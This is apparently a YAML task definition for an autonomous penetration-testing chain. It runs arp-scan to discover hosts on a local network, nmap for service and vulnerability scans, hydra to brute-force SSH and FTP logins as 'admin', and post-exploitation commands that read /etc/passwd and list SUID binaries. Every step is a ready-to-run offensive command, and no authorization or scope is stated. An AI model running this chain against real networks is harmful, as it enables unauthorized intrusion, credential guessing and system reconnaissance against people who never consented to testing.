name: full_chain
description: Full attack chain: network discovery → service scan → vulnerability scan → brute force → post-exploitation. End-to-end autonomous pentesting.
author: james-linux

params.command: arp-scan -l -I {{interface}} 2>/dev/null | grep -E '^[0-9]' | awk '{print $1}' | sort -u > /tmp/james_chain_hosts.txt && echo 'Discovered hosts:' && cat /tmp/james_chain_hosts.txt

steps.description: Phase 1: L2 host discovery on local network

params.command: for h in $(cat /tmp/james_chain_hosts.txt | head -5); do echo "=== Scanning $h ==="; nmap -sV --top-ports 100 -T4 $h; done

steps.description: Phase 2: Service enumeration on discovered hosts

params.command: for h in $(cat /tmp/james_chain_hosts.txt | head -3); do echo "=== Vuln scan $h ==="; nmap --script vuln -T4 $h 2>/dev/null | grep -E 'VULNERABLE|CVE|Script|PORT'; done

steps.description: Phase 3: Vulnerability detection on top targets

params.command: for h in $(cat /tmp/james_chain_hosts.txt | head -3); do echo "=== Brute $h ==="; hydra -l admin -P {{wordlist}} $h ssh -t 2 -f 2>&1 | tail -3; hydra -l admin -P {{wordlist}} $h ftp -t 2 -f 2>&1 | tail -3; done

steps.description: Phase 4: Brute-force SSH and FTP on top targets

params.command: echo '=== POST-EXPLOITATION RECON ===' && echo '--- System ---' && uname -a && echo '--- Users ---' && cat /etc/passwd | grep -v nologin | head -10 && echo '--- SUID ---' && find / -perm -4000 2>/dev/null | head -10 && echo '--- Network ---' && ss -tlnp 2>/dev/null | head -10
